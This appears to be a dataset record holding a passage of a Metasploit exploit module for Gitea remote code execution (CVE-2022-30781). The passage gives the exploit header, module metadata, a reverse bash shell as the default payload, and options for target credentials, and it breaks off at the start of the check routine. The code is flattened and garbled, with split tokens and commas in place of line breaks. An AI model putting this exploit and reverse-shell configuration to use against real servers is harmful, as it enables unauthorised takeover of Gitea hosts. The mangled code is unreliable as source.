{
    "text": "vul_name : Gitea 1.16.6 Remote Code Execution ， vul_cve : CVE-2022-30781 ， vul_poc :  # Exploit Title : Gitea Git Fetch Remote Code Execution ，  # Date : 09/14/2022 ，  # Exploit Author : samguy ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : <= 1.16.6 ，  # Tested on : Linux - Debian ，  # Ref :  ，  # CVE : CVE-2022-30781 ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : Remote : HttpServer ， super (  ， update_info (  ， info ,  ， 'Name' => 'Gitea Git Fetch Remote Code Execution' ,  ， 'Description' => %q{ ， This module exploits Git fetch command in Gitea repository migration ， process that leads to a remote command execution on the system. ， This vulnerability affect Gitea before 1.16.7 version. ， } ,  ， 'Author' => [  ， 'wuhan005 & li4n0' ,  # Original PoC ， 'krastanoel' # MSF Module ，  ]  ,  ， ' ，  [ 'CVE' , '2022-30781' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'DisclosureDate' => '2022-05-16' ,  ， 'License' => MSF_LICENSE ,  ， 'Platform' => %w [ unix win ]  ,  ， 'Arch' => ARCH_CMD ,  ， 'Privileged' => false ,  ， 'Targets' => [  ，  [  ， 'Unix Command' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'Type' => : unix_cmd ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'cmd/unix/reverse_bash' ， } ， } ，  ]  ,  ，  ]  ,  ， 'DefaultOptions' => { 'WfsDelay' => 30 } ,  ， 'DefaultTarget' => 0 ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [  ]  ， } ， register_options (  [  ， Opt : RPORT ( 3000 )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'Base path' , '/' ]  )  ,  ， OptString.new ( 'USERNAME' ,  [ true , 'Username to authenticate with' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'Password to use' ]  )  ,  ， OptInt.new ( 'HTTPDELAY' ,  [ false , 'Number of seconds the web server will wait' , 12 ]  )  ，  ]  )  ， end ， def check ， res = send_request_cgi (  ， 'method' => 'GET' ,  ， 'uri' => normalize_uri ( target_uri.path , '/user/login' )  ,  ， 'keep_cookies' => true",
    "time": "2022.09.15"
}